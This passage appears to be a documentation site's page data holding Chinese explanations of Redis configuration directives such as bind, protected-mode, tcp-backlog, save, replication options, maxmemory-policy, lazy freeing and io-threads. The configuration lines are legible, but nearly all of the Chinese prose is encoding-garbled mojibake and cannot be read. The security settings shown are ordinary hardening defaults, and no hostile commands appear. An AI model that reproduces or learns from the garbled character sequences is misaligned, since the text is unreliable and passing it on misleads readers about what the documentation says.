scripting lua èæ¬",slug:"lua-scripting-lua-èæ¬",normalizedTitle:"lua scripting lua èæ¬",charIndex:11082},{level:2,title:"- cluster éç¾¤",slug:"cluster-éç¾¤",normalizedTitle:"- cluster éç¾¤",charIndex:11491},{level:2,title:"slow logæ¢æ¥å¿",slug:"slow-logæ¢æ¥å¿",normalizedTitle:"slow log æ¢æ¥å¿",charIndex:12890},{level:2,title:"latency monitor å»¶è¿çè§å¨",slug:"latency-monitor-å»¶è¿çè§å¨",normalizedTitle:"latency monitor å»¶è¿çè§å¨",charIndex:13211},{level:2,title:"event notification äºä»¶éç¥",slug:"event-notification-äºä»¶éç¥",normalizedTitle:"event notification äºä»¶éç¥",charIndex:13446},{level:2,title:"advanced config é«çº§éç½®",slug:"advanced-config-é«çº§éç½®",normalizedTitle:"advanced config é«çº§éç½®",charIndex:13506}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"network ç½ç» + bind + protected-mode + port + tcp-backlog æ¥çéåå¤§å° ä¿®æ¹éåå¤§å° timeout tcp-keepalive general ä¸è¬ daemonize supervised pidfile loglevel logfile databases always-show-logo snapshotting å¿«ç§ save stop-writes-on-bgsave-error rdbcompression rdbchecksum dbfilename rdb-del-sync-files åå»ºrdbæä»¶æºå¶ replication ä¸»ä»å¤å¶ replica-serve-stale-data replica-read-only repl-diskless-sync repl-diskless-sync-delay repl-diskless-load repl-disable-tcp-nodelay replica-priority - keys tracking é®è¿½è¸ª security å®å¨ + acllog-max-len - aclfile - requirepass - rename-command clients å®¢æ· maxclients memory management åå­ç®¡ç maxmemory maxmemory-policy maxmemory-samples replica-ignore-maxmemory active-expire-effort lazy freeing ææ°éæ¾ lazyfree-lazy-eviction lazyfree-lazy-expire lazyfree-lazy-server-del slave-lazy-flush lazyfree-lazy-user-del threaded I/O çº¿ç¨ io-threads-do-reads kernel oom control åæ ¸ oom æ§å¶ append only mode AOF è¿½å æ¨¡å¼ appendonly appendfilename appendfsync no-appendfsync-on-rewrite auto-aof-rewrite-percentage auto-aof-rewrite-min-size auto-aof-rewrite-min-size rewriteæºå¶ aof-load-truncated aof-use-rdb-preamble lua scripting lua èæ¬ - cluster éç¾¤ slow logæ¢æ¥å¿ latency monitor å»¶è¿çè§å¨ event notification äºä»¶éç¥ advanced config é«çº§éç½®",content:'> + é»è®¤éç½®æå¼ï¼- é»è®¤éç½®å³é­\n\n\n# network ç½ç»\n\n\n# + bind\n\n# ç»å®IP\nbind 127.0.0.1\n\n\n1\n2\n\n\né»è®¤æ¯ 127.0.0.1ï¼ä¿®æ¹ç IP å¦æä¸ä¸ºæ¬æº IP æ¯æ æ³å¯å¨çãå¯ä»¥ç´æ¥æ³¨é bindï¼è¿æ ·æææºå¨å¯è¿ï¼ä½ä¼å protected-mode åæ°å½±åã\n\n\n# + protected-mode\n\n# åä¿æ¤ç é»è®¤å¼å¯\nprotected-mode yes\n\n\n1\n2\n\n\nä¿æ¤æ¨¡å¼ä¸ï¼æ è®º bind æ¯å¦è¢«æ³¨éé½æ æ³è¿ç¨è®¿é®ãæ³åè®¸å¤ç½æå±åç½è®¿é®éè¦å³é­ä¿æ¤æ¨¡å¼ï¼ä¸æ³¨é bindã\n\n\n# + port\n\n### ç«¯å£é»è®¤\nport 6379\n\n\n1\n2\n\n\n\n# + tcp-backlog\n\ntcp-backlog 511\n\n\n1\n\n\nLinux åæ ¸ä¸ºæ¯ä¸ª TCP æå¡å¨ç¨åºç»´æ¤ä¸¤æ¡ backlog éåï¼ä¸æ¡æ¯ TCP å±çæªè¿æ¥éåï¼ä¸æ¡æ¯åºç¨å±çå·²è¿æ¥éåï¼åå«å¯¹åº net.ipv4.tcp_max_syn_backlog å net.core.somaxconn ä¸¤ä¸ªåæ ¸åæ°ã\n\nä¸ä¸ªå®¢æ·ç«¯è¿æ¥å¨å®æ TCP 3 æ¬¡æ¡æä¹åé¦åè¿å¥å°æªè¿æ¥éåï¼å®ææ¡æä¹åæ­£å¼å»ºç«è¿æ¥ï¼è¿å¥å·²è¿æ¥éåï¼äº¤ä»ç»åºç¨ç¨åºå¤çãåºç¨ç¨åºè°ç¨ accept () å½æ°ä»å·²è¿æ¥éåååºè¿æ¥è¿è¡å¤çãåºç¨å±å¨è°ç¨ listen () å½æ°æ¶æå®ç backlog æ¯å·²è¿æ¥éåå¤§å°ï¼å¦æå¤§äº somaxconn å°è¢«è®¾ä¸º somaxconnã\n\nå¦æåºç¨å±ä¸è°ç¨ accept () å½æ°å¤çä¸ä¸ªè¿æ¥ï¼æèå¤çä¸åæ¶çè¯ï¼å°ä¼å¯¼è´å·²è¿æ¥éåå æ»¡ãå·²è¿æ¥éåå·²æ»¡çè¯ä¼å¯¼è´æªè¿æ¥éåå¨å¤çå® 3 æ¬¡æ¡æä¹åæ æ³è¿å¥å·²è¿æ¥éåï¼æç»ä¹å¯¼è´æªè¿æ¥éåå æ»¡ï¼å¨æå¡å¨çå°å¤äºæªè¿æ¥éåä¸­çè¿æ¥ç¶æä¸º SYN_RECVã æ°è¿æ¥çå®¢æ·ç«¯è¿æ¥å°ä¼ä¸ç´å¤äº SYN_SENT ç¶æç­å¾æå¡å¨ç ACK åºç­ï¼æç»å¯¼è´è¿æ¥è¶æ¶ã\n\n# æ¥çéåå¤§å°\n\næ¥çæªè¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/ipv4/tcp_max_syn_backlog\n\n\n1\n\n\næ¥çå·²è¿æ¥éåé»è®¤å¼ï¼\n\ncat /proc/sys/net/core/somaxconn\n\n\n1\n\n\n# ä¿®æ¹éåå¤§å°\n\nå¯ä»¥ç´æ¥æ¹åè¿ä¸¤ä¸ªæä»¶çå¼ãè¦æ°¸ä¹ä¿®æ¹è¿ä¸¤ä¸ªåæ ¸åæ°çè¯å¯ä»¥åå° /etc/sysctl.conf\n\nnet.ipv4.tcp_max_syn_backlog = 1024\nnet.core.somaxconn = 1024\n\n\n1\n2\n\n\næ¹å®åæ§è¡ sysctl -p è®©ä¿®æ¹ç«å³çæã\n\n\n# timeout\n\ntimeout 0\n\n\n1\n\n\nå®¢æ·ç«¯é²ç½® N ç§åå³é­è¿æ¥ï¼0 ç¦ç¨ï¼\n\n\n# tcp-keepalive\n\ntcp-keepalive 300\n\n\n1\n\n\nåå®¢æ·ç«¯åé TCP ACK æ£æµè¿æ¥æ¯å¦æ­å¼ï¼ä¿è¯è¿æ¥æ´»è·ãåä½ç§ï¼é»è®¤ 300 ç§åéä¸æ¬¡ï¼å¦æç­äº 0 å°±æ¯ç¦ç¨ã\n\n\n# general ä¸è¬\n\n\n# daemonize\n\ndaemonize no\n\n\n1\n\n\né»è®¤æåµä¸ï¼Redis ä¸ä¼ä½ä¸ºå®æ¤ç¨åºè¿è¡ãå¦æéè¦ï¼è¯·è®¾ç½®ä¸º yesãè¯·æ³¨æï¼Redis å®æ¤è¿ç¨å°å¨ /var/run/redis.pid ä¸­åå¥ä¸ä¸ª pid æä»¶ã\n\n\n# supervised\n\nsupervised no\n\n\n1\n\n\nå¦æéè¦å¨æºå¨å¯å¨ï¼upstart æ¨¡å¼ æ systemd æ¨¡å¼ï¼æ¶å°±å¯å¨ Redis æå¡å¨ï¼å¯ä»¥éè¿è¯¥éé¡¹æ¥éç½® Redisã\n\n * supervised no - ä¸ä¼ä¸ supervised tree è¿è¡äº¤äº\n * supervised upstart - å° Redis æå¡å¨æ·»å å° SIGSTOP æ¨¡å¼ä¸­\n * supervised systemd - å° READY=1 åå¥ $NOTIFY_SOCKET\n * supervised auto - æ ¹æ®ç¯å¢åé UPSTART_JOB æ NOTIFY_SOCKET æ£æµ upstart è¿æ¯ systemd\n\nä¸è¿° supervision æ¹æ³ï¼upstart æ systemdï¼ä»ååº âç¨åºå·²å°±ç»ªâ ä¿¡å·ï¼ä¸ä¼ç»§ç»­ç» supervisor è¿å ping åå¤ã\n\n\n# pidfile\n\npidfile /var/run/redis_6379.pid\n\n\n1\n\n\nå½ Redis æå¡å¨å·²å®æ¤è¿ç¨å¯å¨æ¶ï¼å¦ææå®äºéç½®æä»¶ï¼åç´æ¥ä½¿ç¨ï¼å¦ææ²¡ææå®ï¼ååå»º /var/run/redis.pid ä½ä¸ºéç½®æä»¶ã\n\n\n# loglevel\n\nloglevel notice\n\n\n1\n\n\næå®æå¡å¨ç verbosity çº§å«ãRedis æä¾åç§çº§å«ï¼\n\n * debug åå«å¤§éä¿¡æ¯ï¼ç¨äºå¼ååæµè¯\n * verbose åå«ä¸äºç¨æçæç¨ä¿¡æ¯ï¼ä½æ²¡æ debug çº§å«æ··ä¹±\n * notice ééæç¤ºä¿¡æ¯ï¼ç¨äºçäº§ç¯å¢\n * warning åªåå«éå¸¸éè¦åå³é®çä¿¡æ¯\n\n\n# logfile\n\nlogfile ""\n\n\n1\n\n\næå®æ¥å¿æä»¶åç§°ãæå®ä¸ºç©ºæ¶å°è¾åºå°æ åè¾åºè®¾å¤ä¸­ãå¦æ Redis ä»¥å®æ¤è¿ç¨å¯å¨ï¼å½æ¥å¿æä»¶åç§°ä¸ºç©ºæ¶ï¼æ¥å¿å°ä¼è¾åºå° /dev/nullã\n\n\n# databases\n\ndatabases 16\n\n\n1\n\n\nè®¾ç½®æ°æ®åºçæ°éãé»è®¤ä½¿ç¨ 0 å·æ°æ®åºãå¯ä»¥å¨æ¯ä¸ä¸ªè¿æ¥ä¸ä½¿ç¨ SELECT <dbid> æ¥æå®å¦å¤çæ°æ®åºï¼ä½æ¯è¿ä¸ªå¼å¿é¡»å¨ 0 å° database -1 ä¹é´ã\n\n\n# always-show-logo\n\nalways-show-logo yes\n\n\n1\n\n\nredis å¯å¨çæ¶åæ¾ç¤º æ¥å¿ã\n\n\n# snapshotting å¿«ç§\n\n\n# save\n\nsave 900 1\nsave 300 10\nsave 60 10000\n\n\n1\n2\n3\n\n\nè¿äº 900 ç§å¹¶ä¸æ 1 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 300 ç§å¹¶ä¸æ 10 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\nè¿äº 60 ç§å¹¶ä¸è³å°æ 10000 ä¸ª key åçäºæ¹åï¼è§¦å save å¨ä½\n\n\n# stop-writes-on-bgsave-error\n\nstop-writes-on-bgsave-error yes\n\n\n1\n\n\né»è®¤å¼ä¸º yesãå½å¯ç¨äº RDB ä¸æåä¸æ¬¡åå°ä¿å­æ°æ®å¤±è´¥ï¼Redis æ¯å¦åæ­¢æ¥æ¶æ°æ®ãè¿ä¼è®©ç¨æ·æè¯å°æ°æ®æ²¡ææ­£ç¡®æä¹åå°ç£çä¸ï¼å¦åæ²¡æäººä¼æ³¨æå°ç¾é¾ï¼disasterï¼åçäºãå¦æ Redis éå¯äºï¼é£ä¹åå¯ä»¥éæ°å¼å§æ¥æ¶æ°æ®äº\n\n\n# rdbcompression\n\nrdbcompression yes\n\n\n1\n\n\né»è®¤å¼æ¯ yesãå¯¹äºå­å¨å°ç£çä¸­çå¿«ç§ï¼å¯ä»¥è®¾ç½®æ¯å¦è¿è¡åç¼©å­å¨ãå¦ææ¯çè¯ï¼redis ä¼éç¨ LZF ç®æ³è¿è¡åç¼©ãå¦æä½ ä¸æ³æ¶è CPU æ¥è¿è¡åç¼©çè¯ï¼å¯ä»¥è®¾ç½®ä¸ºå³é­æ­¤åè½ï¼ä½æ¯å­å¨å¨ç£çä¸çå¿«ç§ä¼æ¯è¾å¤§ã\n\n\n# rdbchecksum\n\nrdbchecksum yes\n\n\n1\n\n\nå¨å­å¨å¿«ç§åï¼æä»¬è¿å¯ä»¥è®© redis ä½¿ç¨ CRC64 ç®æ³æ¥è¿è¡æ°æ®æ ¡éªï¼ä½æ¯è¿æ ·åä¼å¢å å¤§çº¦ 10% çæ§è½æ¶èï¼å¦æå¸æè·åå°æå¤§çæ§è½æåï¼å¯ä»¥å³é­æ­¤åè½ã\n\n\n# dbfilename\n\ndbfilename dump.rdb\n\n\n1\n\n\nrdb æä»¶å¾æä»¶åç§°\n\n\n# rdb-del-sync-files\n\nrdb-del-sync-files no\n\n\n1\n\n\nrdb æä»¶æ¯å¦å é¤åæ­¥é\n\ndir ./\n\n\n1\n\n\nè®¾ç½® rdb æä»¶å­æ¾å¾è·¯å¾\n\n\n# åå»º rdb æä»¶æºå¶\n\nfork åºä¸ä¸ªå­è¿ç¨æ¥å¤çï¼å®åç¶è¿ç¨å±äº«åå­éé¢çä»£ç æ®µåæ°æ®æ®µãè¿æ¶ä½ å¯ä»¥æç¶å­è¿ç¨æ³è±¡æä¸ä¸ªè¿ä½å©´å¿ï¼ä»ä»¬å¨å±äº«èº«ä½ãè¿å°±æ¯ Linux æä½ç³»ç»çæºå¶ï¼ä¸ºäºèçº¦åå­èµæºï¼æä»¥å°½å¯è½è®©ä»ä»¬å±äº«èµ·æ¥ãå¨è¿ç¨åç¦»çä¸ç¬é´ï¼åå­çå¢é¿å ä¹æ²¡æææ¾ååã\n\nå­è¿ç¨åæ°æ®æä¹åï¼ä¸ä¼ä¿®æ¹ç°æçåå­æ°æ®ç»æï¼å®åªæ¯å¯¹æ°æ®ç»æè¿è¡éåè¯»åï¼ç¶ååºååå°ç£çä¸­ãä½æ¯ç¶è¿ç¨ä¸ä¸æ ·ï¼å®å¿é¡»æç»­æå¡å®¢æ·è¯·æ±ï¼ç¶åå åå­æ°æ®ç»æè¿è¡ä¸é´æ­çä¿®æ¹ã\n\nè¿ä¸ªæ¶åå°±ä¼ä½¿ç¨æä½ç³»ç»ç COW (copy on write) æºå¶æ¥è¿è¡æ°æ®æ®µé¡µé¢çåç¦»ãæ°æ®æ®µæ¯ç±å¾å¤æä½ç³»ç»çé¡µé¢ç»åèæï¼å½ç¶è¿ç¨å¯¹å¶ä¸­ä¸ä¸ªé¡µé¢çæ°æ®è¿è¡ä¿®æ¹æ¶ï¼ä¼å°è¢«å±äº«çé¡µé¢å¤å¶ä¸ä»½åç¦»åºæ¥ï¼ç¶åå¯¹è¿ä¸ªå¤å¶çé¡µé¢è¿è¡ä¿®æ¹ãè¿æ¶å­è¿ç¨ç¸åºçé¡µé¢æ¯æ²¡æååçï¼è¿æ¯è¿ç¨äº§çé£ä¸ç¬é´çæ°æ®ã\n\néçç¶è¿ç¨ä¿®æ¹æä½çæç»­è¿è¡ï¼è¶æ¥è¶å¤çå±äº«é¡µé¢è¢«åç¦»åºæ¥ï¼åå­å°±ä¼æç»­å¢é¿ï¼ä½æ¯ä¹ä¸ä¼è¶è¿åææ°æ®åå­ç 2 åå¤§å°ãå¦å¤ï¼Redis å®ä¾éå·æ°æ®å çæ¯ä¾å¾å¾æ¯æ¯è¾é«çï¼æä»¥å¾å°ä¼åºç°ææçé¡µé¢é½è¢«åç¦»çæåµï¼è¢«åç¦»çå¾å¾åªæå¶ä¸­ä¸é¨åé¡µé¢ãæ¯ä¸ªé¡µé¢çå¤§å°åªæ 4KBï¼ä¸ä¸ª Redis å®ä¾éé¢ä¸è¬é½ä¼ææåä¸ä¸ä¸ªé¡µé¢ã\n\nå­è¿ç¨å ä¸ºæ°æ®æ²¡æååï¼å®è½çå°åå­éçæ°æ®å¨è¿ç¨äº§ççä¸ç¬é´å°±ååºäºï¼åä¹ä¸ä¼æ¹åï¼è¿ä¹æ¶ä¸ºä»ä¹ redis çæä¹åå« å¿«ç§ çåå ãæ¥ä¸æ¥å­è¿ç¨å°±å¯ä»¥éå¸¸å®å¿å°ä¾¿å©æ°æ®ï¼è¿è¡åºååç£çäºã\n\n\n# replication ä¸»ä»å¤å¶\n\n\n# replica-serve-stale-data\n\nreplica-serve-stale-data yes\n\n\n1\n\n\nå½ä¸ä¸ª slave ä¸ master å¤±å»èç³»æ¶ï¼æèå¤å¶æ­£å¨è¿è¡çæ¶åï¼slave åºå¯¹è¯·æ±çè¡ä¸º:\n\n * å¦æä¸º yesï¼é»è®¤å¼ï¼ï¼slave ä»ç¶ä¼åºç­å®¢æ·ç«¯è¯·æ±ï¼ä½è¿åçæ°æ®å¯è½æ¯è¿æ¶ï¼æèæ°æ®å¯è½æ¯ç©ºçå¨ç¬¬ä¸æ¬¡åæ­¥çæ¶å\n * å¦æä¸º no ï¼å¨ä½ æ§è¡é¤äº info å salveof ä¹å¤çå¶ä»å½ä»¤æ¶ï¼slave é½å°è¿åä¸ä¸ª "SYNC with master in progress" çéè¯¯ã\n\n\n# replica-read-only\n\nreplica-read-only yes\n\n\n1\n\n\nè®¾ç½® slave æ¯å¦æ¯åªè¯»çãä» 2.6 çèµ·ï¼slave é»è®¤æ¯åªè¯»ç\n\n\n# repl-diskless-sync\n\nrepl-diskless-sync no\n\n\n1\n\n\nä¸»ä»æ°æ®å¤å¶æ¯å¦ä½¿ç¨æ ç¡¬çå¤å¶åè½ã\n\n\n# repl-diskless-sync-delay\n\nrepl-diskless-sync-delay 5\n\n\n1\n\n\næ ç£ç (diskless) æ¹å¼å¨è¿è¡æ°æ®ä¼ éä¹åä¼æä¸ä¸ªæ¶é´çå»¶è¿ï¼ä»¥ä¾¿ slave ç«¯è½å¤è¿è¡å°å¾ä¼ éçç®æ éåä¸­ï¼è¿ä¸ªæ¶é´é»è®¤æ¯ 5 ç§\n\n\n# repl-diskless-load\n\nrepl-diskless-load disabled\n\n\n1\n\n\n\n# repl-disable-tcp-nodelay\n\nrepl-disable-tcp-nodelay no\n\n\n1\n\n\næ¯å¦å¯ç¨ TCP_NODELAYï¼å¦æå¯ç¨åä¼ä½¿ç¨å°éç TCP ååå¸¦å®½å»è¿è¡æ°æ®ä¼ è¾å° slave ç«¯ï¼å½ç¶éåº¦ä¼æ¯è¾æ¢ï¼å¦æä¸å¯ç¨åä¼ è¾éåº¦æ¯è¾å¿«ï¼ä½æ¯ä¼å ç¨æ¯è¾å¤çå¸¦å®½ã\n\n\n# replica-priority\n\nreplica-priority 100\n\n\n1\n\n\nå½ master ä¸è½æ­£å¸¸å·¥ä½çæ¶åï¼Redis Sentinel ä¼ä» slaves ä¸­éåºä¸ä¸ªæ°ç masterï¼è¿ä¸ªå¼è¶å°ï¼å°±è¶ä¼è¢«ä¼åéä¸­ï¼ä½æ¯å¦ææ¯ 0 ï¼ é£æ¯æå³çè¿ä¸ª slave ä¸å¯è½è¢«éä¸­ã é»è®¤ä¼åçº§ä¸º 100ã\n\n\n# - keys tracking é®è¿½è¸ª\n\ntracking-table-max-keys 1000000\n\n\n1\n\n\n\n# security å®å¨\n\n\n# + acllog-max-len\n\nacllog-max-len 128\n\n\n1\n\n\n\n# - aclfile\n\naclfile /etc/redis/users.acl\n\n\n1\n\n\n\n# - requirepass\n\nrequirepass foobared\n\n\n1\n\n\n\n# - rename-command\n\nrename-command CONFIG ""\n\n\n1\n\n\n\n# clients å®¢æ·\n\n\n# maxclients\n\nmaxclients 10000\n\n\n1\n\n\nè®¾ç½®æå¤§è¿æ¥å®¢æ·ç«¯æ°ãé»è®¤æåµä¸ï¼æ­¤éå¶è®¾ç½®ä¸º 10000 ä¸ªå®¢æ·ç«¯ï¼ä½æ¯ï¼å¦æ Redis æå¡å¨æ æ³å°è¿ç¨æä»¶éå¶éç½®ä¸ºåè®¸æå®çéå¶ï¼ååè®¸çæå¤§å®¢æ·ç«¯æ°å°è®¾ç½®ä¸ºå½åæä»¶éå¶åå» 32ï¼å ä¸º Redis ä¿çäºåé¨ä½¿ç¨çæä»¶æè¿°ç¬¦å¾å°ï¼\n\nè¾¾å°éå¶åï¼Redis å°å³é­æææ°è¿æ¥ï¼å¹¶åééè¯¯æ¶æ¯ âå·²è¾¾å°æå¤§å®¢æ·ç«¯æ°ã\n\nå½ä½¿ç¨ Redis Cluster æ¶ï¼æå¤§è¿æ¥æ°ä¹ä¼ä¸éç¾¤æ»çº¿å±äº«ï¼éç¾¤ä¸­çæ¯ä¸ªèç¹å°ä½¿ç¨ä¸¤ä¸ªè¿æ¥ï¼ä¸ä¸ªè¿å¥ï¼å¦ä¸ä¸ªåå¤ãå¯¹äºéå¸¸å¤§çéç¾¤ï¼éè¦çæ¯ç¸åºå°è°æ´éå¶å¤§å°ã\n\n\n# memory management åå­ç®¡ç\n\n\n# maxmemory\n\nmaxmemory <bytes>\n\n\n1\n\n\nå°åå­ä½¿ç¨éå¶è®¾ç½®ä¸ºæå®çå­èæ°ãå½è¾¾å°åå­éå¶æ¶ï¼Redis å°å°è¯æ ¹æ®æéçç­ç¥æ¥å é¤ keyï¼è¯·åè§ maxmemory-policyï¼ã\n\nå¦æ Redis æ æ³æ ¹æ®è¯¥ç­ç¥å é¤ keyï¼æèå¦æè¯¥ç­ç¥è®¾ç½®ä¸º \'noeviction\'ï¼å Redis å°å¼å§å¯¹å°ä½¿ç¨æ´å¤åå­çå½ä»¤ï¼ä¾å¦ SETï¼LPUSH ç­ï¼è¿è¡éè¯¯ç­å¤ï¼å¹¶å°ç»§ç»­ç­å¤è¯¸å¦ GET ä¹ç±»çåªè¯»å½ä»¤ã(ä¸æ¯æåï¼åªæ¯æè¯»)\n\nå¦ææ¯ä¸»ä»å¤å¶ï¼å»ºè®®æ¨ä¸º maxmemory è®¾ç½®ä¸ä¸ªä¸éï¼ä»¥ä¾¿ç³»ç»ä¸æä¸äºå¯ç¨åå­ç¨äº âä»â è¾åºç¼å²åºï¼ä½æ¯å¦æç­ç¥ä¸º \'noeviction\'ï¼åä¸éè¦è¿æ ·åï¼ã\n\n\n# maxmemory-policy\n\nmaxmemory-policy noeviction\n\n\n1\n\n\nmaxmemory ç­ç¥ï¼è¾¾å° maxmemory æ¶ï¼Redis å°å¦ä½éæ©è¦å é¤çåå®¹ãæ¨å¯ä»¥ä»ä»¥ä¸è¡ä¸ºä¸­éæ©ä¸ç§ï¼\n\n * volatile-lruï¼å©ç¨ LRU ç®æ³ç§»é¤è¿æ keysã\n * allkeys-lruï¼å©ç¨ LRU ç®æ³ç§»é¤ keysã\n * volatile-randomï¼éæºç§»é¤è¿æ keysã\n * allkeys-randomï¼éæºç§»é¤ keysã\n * volatile-ttlï¼æç§æè¿è¿ææ¶é´æ¥å é¤ï¼è¾ä»¥ TTLï¼ï¼ç§»é¤å³å°è¿æç keysã\n * noevictionï¼ä¸ç§»é¤ä»»ä½ keyï¼åªæ¯è¿åä¸ä¸ªåéè¯¯ã\n\n\n# maxmemory-samples\n\nmaxmemory-samples 5\n\n\n1\n\n\nRedis ä¸­ç LRU ä¸æ¯ä¸¥æ ¼æä¹ä¸ç LRU ç®æ³å®ç°ï¼æ¯ä¸ç§è¿ä¼¼ç LRU å®ç°ï¼ä¸»è¦æ¯ä¸ºäºèçº¦åå­å ç¨ä»¥åæåæ§è½ã\n\nRedis ç LRU æ¯ååº éç½®çæ°ç®ç key (5)ï¼ç¶åä»ä¸­éæ©ä¸ä¸ªæè¿æä¸ç»å¸¸ä½¿ç¨ç key è¿è¡ç½®æ¢ã\n\nå¯¹ LRU æ¥è¯´ 5 æ¯æ¯è¾åéçã10 å·²ç»å¾æ¥è¿äºçæ­£ç LRUï¼ä½ä¼æ¶èæ´å¤ç CPUã3 ä¼æ´å¿«ä½æ²¡æé£ä¹ç²¾ç¡®ã\n\n\n# replica-ignore-maxmemory\n\nreplica-ignore-maxmemory yes\n\n\n1\n\n\nä» Redis 5 å¼å§ï¼é»è®¤æåµä¸ï¼replica èç¹ä¼å¿½ç¥ maxmemory è®¾ç½®ï¼é¤éå¨åç failover åï¼æ­¤èç¹è¢«æåä¸º master èç¹ï¼ã è¿æå³çåªæ master æä¼æ§è¡è¿æå é¤ç­ç¥ï¼å¹¶ä¸ master å¨å é¤é®ä¹åä¼å¯¹ replica åé DEL å½ä»¤ã\n\nè¿ä¸ªè¡ä¸ºä¿è¯äº master å replicas çä¸è´æ§ï¼å¹¶ä¸è¿éå¸¸ä¹æ¯ä½ éè¦çï¼ä½æ¯è¥ä½ ç replica èç¹æ¯å¯åçï¼ æèä½ å¸æ replica èç¹æä¸åçåå­éç½®ï¼å¹¶ä¸ä½ ç¡®ä¿ææå° replica åæä½é½å¹ç­çï¼é£ä¹ä½ å¯ä»¥ä¿®æ¹è¿ä¸ªé»è®¤çè¡ä¸º ï¼è¯·ç¡®ä¿ä½ æç½ä½ å¨åä»ä¹ï¼ã\n\néè¦æ³¨æçæ¯é»è®¤æåµä¸ replica èç¹ä¸ä¼æ§è¡è¿æç­ç¥ï¼å®æå¯è½ä½¿ç¨äºè¶è¿ maxmemory è®¾å®çå¼çåå­ã å æ­¤ä½ éè¦çæ§ replicas èç¹æå¨çæºå¨å¹¶ä¸ç¡®ä¿å¨ master èç¹å°è¾¾éç½®ç maxmemory å¤§å°æ¶ï¼ replicas èç¹ä¸ä¼è¶è¿ç©çåå­çå¤§å°ã\n\n\n# active-expire-effort\n\nactive-expire-effort 1\n\n\n1\n\n\n\n# lazy freeing ææ°éæ¾\n\nlazy free åºç¨äºè¢«å¨å é¤ä¸­ï¼ç®åæ 4 ç§åºæ¯ï¼æ¯ç§åºæ¯å¯¹åºä¸ä¸ªéç½®åæ°ï¼ é»è®¤é½æ¯å³é­ã\n\nlazyfree-lazy-eviction no\nlazyfree-lazy-expire no\nlazyfree-lazy-server-del no\nreplica-lazy-flush no\n\n\n1\n2\n3\n4\n\n\n\n# lazyfree-lazy-eviction\n\néå¯¹ redis åå­ä½¿ç¨è¾¾å° maxmeoryï¼å¹¶è®¾ç½®ææ·æ±°ç­ç¥æ¶ï¼å¨è¢«å¨æ·æ±°é®æ¶ï¼æ¯å¦éç¨ lazy free æºå¶ï¼\n\nå ä¸ºæ­¤åºæ¯å¼å¯ lazy free, å¯è½ä½¿ç¨æ·æ±°é®çåå­éæ¾ä¸åæ¶ï¼å¯¼è´ redis åå­è¶ç¨ï¼è¶è¿ maxmemory çéå¶ãæ­¤åºæ¯ä½¿ç¨æ¶ï¼è¯·ç»åä¸å¡æµè¯ã\n\n\n# lazyfree-lazy-expire\n\néå¯¹è®¾ç½®æ TTL çé®ï¼è¾¾å°è¿æåï¼è¢« redis æ¸çå é¤æ¶æ¯å¦éç¨ lazy free æºå¶ï¼\n\næ­¤åºæ¯å»ºè®®å¼å¯ï¼å  TTL æ¬èº«æ¯èªéåºè°æ´çéåº¦ã\n\n\n# lazyfree-lazy-server-del\n\néå¯¹æäºæä»¤å¨å¤çå·²å­å¨çé®æ¶ï¼ä¼å¸¦æä¸ä¸ªéå¼ç DEL é®çæä½ãrename å½ä»¤å½ç®æ é®å·²å­å¨ï¼redis ä¼åå é¤ç®æ é®ï¼å¦æè¿äºç®æ é®æ¯ä¸ä¸ª big key, é£å°±ä¼å¼å¥é»å¡å é¤çæ§è½é®é¢ã æ­¤åæ°è®¾ç½®å°±æ¯è§£å³è¿ç±»é®é¢ï¼å»ºè®®å¯å¼å¯ã\n\n\n# slave-lazy-flush\n\néå¯¹ slave è¿è¡å¨éæ°æ®åæ­¥ï¼slave å¨å è½½ master ç RDB æä»¶åï¼ä¼è¿è¡ flushall æ¥æ¸çèªå·±çæ°æ®åºæ¯ï¼åæ°è®¾ç½®å³å®æ¯å¦éç¨å¼å¸¸ flush æºå¶ãå¦æåå­åå¨ä¸å¤§ï¼å»ºè®®å¯å¼å¯ãå¯åå°å¨éåæ­¥èæ¶ï¼ä»èåå°ä¸»åºå è¾åºç¼å²åºçæ¶¨å¼èµ·çåå­ä½¿ç¨å¢é¿ã\n\n\n# lazyfree-lazy-user-del\n\nå¯¹äºä¸å®¹æç¨ UNLINK è°ç¨æ¿æ¢ç¨æ·ä»£ç  DEL è°ç¨çæåµï¼ä¹å¯ä»¥ä½¿ç¨ lazyfree-lazy-user-del yes éç½®æä»¤å° DEL å½ä»¤çé»è®¤è¡ä¸ºä¿®æ¹ä¸ºä¸ UNLINK å®å¨ç¸åã\n\n\n# threaded I/O çº¿ç¨\n\né»è®¤æåµä¸ï¼çº¿ç¨æ¯ç¦ç¨çï¼æä»¬å»ºè®®ä»å¨å·æè³å° 4 ä¸ªææ´å¤åæ ¸çè®¡ç®æºä¸å¯ç¨å®ï¼èè³å°ä¿çä¸ä¸ªå¤ç¨åæ ¸ãä½¿ç¨ 8 ä¸ªä»¥ä¸ççº¿ç¨ä¸å¤ªå¯è½æå¾å¤§å¸®å©ãæä»¬è¿å»ºè®®å¨ç¡®å®å­å¨æ§è½é®é¢æ¶åä½¿ç¨çº¿ç¨ I / Oï¼Redis å®ä¾ä¼ä½¿ç¨å¾å¤§ä¸é¨å CPU æ¶é´ï¼å¦åå°±æ²¡æå¿è¦ä½¿ç¨æ­¤åè½ã\n\nio-threads 4\n\n\n1\n\n\nå æ­¤ï¼å¦ææ¨æåä¸ªæ ¸çï¼è¯·å°è¯ä½¿ç¨ 2 æ 3 ä¸ª I / O çº¿ç¨ï¼å¦ææ¨æ 8 ä¸ªæ ¸ï¼è¯·å°è¯ä½¿ç¨ 6 ä¸ªçº¿ç¨ã\n\n\n# io-threads-do-reads\n\nio-threads-do-reads no\n\n\n1\n\n\néå¸¸ï¼å° io-threads è®¾ç½®ä¸º 1 åªä¼ä½¿ç¨ä¸»çº¿ç¨ãå¯ç¨ I / O çº¿ç¨åï¼æä»¬ä»å°çº¿ç¨ç¨äºåæä½ï¼å³å¯¹ write ç³»ç»è°ç¨è¿è¡çº¿ç¨åï¼å¹¶å°å®¢æ·ç«¯ç¼å²åºä¼ è¾å°å¥æ¥å­ãä½æ¯ï¼ä¹å¯ä»¥éè¿ io-threads-do-reads yes æ¥å¯ç¨è¯»åçº¿ç¨ååè®®è§£æãéå¸¸ï¼çº¿ç¨è¯»åæ²¡æå¤ªå¤§å¸®å©ã\n\næ æ³å¨è¿è¡æ¶éè¿ CONFIG SET æ´æ¹æ­¤éç½®æä»¤ãå¯ç¨ S SL æ¶ï¼Aso 